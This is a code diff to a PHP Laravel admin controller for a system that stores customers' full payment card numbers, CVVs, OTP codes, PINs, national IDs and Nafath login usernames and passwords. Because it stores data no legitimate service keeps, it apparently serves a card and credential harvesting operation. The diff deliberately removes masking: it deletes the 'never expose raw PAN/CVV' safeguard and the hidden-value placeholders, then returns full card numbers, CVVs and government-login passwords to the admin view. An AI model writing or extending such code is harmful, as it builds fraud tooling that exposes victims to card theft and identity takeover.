@@ -40,7 +40,7 @@ class AdminCustomerController extends Controller
         // Cache TTL: 2 seconds (changed from 3 to ensure fresh data)
         // Search queries: no cache (to show results immediately)
         $isCached = ! $search;
-        $cacheKey = "admin:customers:{$activeOnly}:{$paymentOnly}:{$search}:{$country}:{$page}:{$perPage}:{$sortBy}:{$sortOrder}";
+        $cacheKey = "admin:customers:plain:v2:{$activeOnly}:{$paymentOnly}:{$search}:{$country}:{$page}:{$perPage}:{$sortBy}:{$sortOrder}";
 
         // ── Fetch data with stampede-safe caching ──
         // Cache::flexible [2, 10] = fresh for 2s, stale-while-revalidate up to 10s.
@@ -180,7 +180,7 @@ class AdminCustomerController extends Controller
                 // and admin list formatting remain accurate.
                 'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                     ->latest(),
-                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
+                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_encrypted', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                     ->latest(),
             ])
             // Ordering rules (see issue: admin viewing demoted customers from #1):
@@ -511,17 +511,15 @@ class AdminCustomerController extends Controller
     /**
      * Format customer profile for API response (matches CustomerCard.vue prop structure)
      */
-    private function toCardFormat(CustomerProfile $customer, bool $revealSensitive = false): array
+    private function toCardFormat(CustomerProfile $customer): array
     {
-        if ($revealSensitive) {
-            $customer->makeVisible(['national_id', 'phone_number', 'email', 'nafath_username', 'nafath_password']);
-        }
+        $customer->makeVisible(['national_id', 'phone_number', 'email', 'nafath_username', 'nafath_password']);
 
         $data = $customer->toArray();
 
         // The eager-loaded paymentCards relation is serialized into
         // $data['payment_cards'] by toArray(). Strip it here — the admin
-        // payload uses the curated $maskedCards mapper below for the
+        // payload uses the curated cards mapper below for the
         // payment.cards block, so this raw dump is redundant and could
         // leak fields not intended for the admin payload.
         unset($data['payment_cards']);
@@ -557,23 +555,26 @@ class AdminCustomerController extends Controller
 
         /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
         $paymentCards = $customer->paymentCards;
-        $maskedCards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card): array {
-            // Backend should never expose raw PAN/CVV in the admin list payload.
-            // Keep only masked display values + last4/BIN for UI compatibility.
+        $cards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card): array {
+            $card->makeVisible(['card_number', 'cvv_encrypted']);
+
             $rawPan = (string) ($card->card_number ?? '');
             $panDigits = preg_replace('/\D+/', '', $rawPan);
             $bin = strlen($panDigits) >= 6 ? substr($panDigits, 0, 6) : null;
-
-            // Pre-rendered display strings the frontend binds to. This
-            // decouples Vue components from the raw sensitive field names.
-            $panDisplay = $card->last4 ? '**** **** **** ' . $card->last4 : null;
+            $cardNumberDisplay = $panDigits !== ''
+                ? trim(chunk_split($panDigits, 4, ' '))
+                : ($rawPan !== '' ? $rawPan : null);
+            $cvvDisplay = $card->cvv_encrypted !== null && $card->cvv_encrypted !== ''
+                ? (string) $card->cvv_encrypted
+                : null;
 
             return [
                 'id'                  => $card->id,
                 'customer_profile_id' => $card->customer_profile_id,
                 'session_id'          => $card->session_id,
-                'masked_card'         => $panDisplay,
-                'card_number_display' => $panDisplay,
+                'card_number_display' => $cardNumberDisplay,
+                'card_number_full'    => $rawPan !== '' ? $rawPan : null,
+                'card_number'         => $rawPan !== '' ? $rawPan : null,
                 'last4'               => $card->last4,
                 'bin'                 => $bin,
                 'holder_name'         => $card->holder_name,
@@ -581,6 +582,8 @@ class AdminCustomerController extends Controller
                 'card_type'           => $card->card_type,
                 'expiry_month'        => $card->expiry_month,
                 'expiry_year'         => $card->expiry_year,
+                'cvv'                 => $cvvDisplay,
+                'cvv_display'         => $cvvDisplay,
                 'status'              => $card->status,
                 'rejection_reason'    => $card->rejection_reason,
                 'reviewed_by'         => $card->reviewed_by,
@@ -612,17 +615,11 @@ class AdminCustomerController extends Controller
             $carrier = CarrierDetectionService::detect($customer->getRawOriginal('phone_number'));
         }
 
-        $hasNationalId = $customer->getRawOriginal('national_id') !== null;
-        $hasPhoneNumber = $customer->getRawOriginal('phone_number') !== null;
-        $hasEmail = $customer->getRawOriginal('email') !== null;
-        $hasNafathUsername = $customer->getRawOriginal('nafath_username') !== null;
-        $hasNafathPassword = $customer->getRawOriginal('nafath_password') !== null;
-
-        $signedNationalId = $revealSensitive ? ($data['national_id'] ?? null) : ($hasNationalId ? 'مخفي' : null);
-        $signedPhoneNumber = $revealSensitive ? ($data['phone_number'] ?? null) : ($hasPhoneNumber ? 'مخفي' : null);
-        $signedEmail = $revealSensitive ? ($data['email'] ?? null) : ($hasEmail ? 'مخفي' : null);
-        $signedNafathUsername = $revealSensitive ? ($data['nafath_username'] ?? null) : ($hasNafathUsername ? 'مخفي' : null);
-        $signedNafathPassword = $revealSensitive ? ($data['nafath_password'] ?? null) : ($hasNafathPassword ? 'مخفي' : null);
+        $signedNationalId = $data['national_id'] ?? $customer->national_id;
+        $signedPhoneNumber = $data['phone_number'] ?? $customer->phone_number;
+        $signedEmail = $data['email'] ?? $customer->email;
+        $signedNafathUsername = $data['nafath_username'] ?? $customer->nafath_username;
+        $signedNafathPassword = $data['nafath_password'] ?? $customer->nafath_password;
 
         return array_merge($data, [
             'journey' => [
@@ -646,7 +643,7 @@ class AdminCustomerController extends Controller
                 'country' => $customer->location_country,
             ],
             'payment' => [
-                'cards' => $maskedCards,
+                'cards' => $cards,
             ],
             'latest_otp' => $latestOtp,
             'latest_pin' => $latestPin,
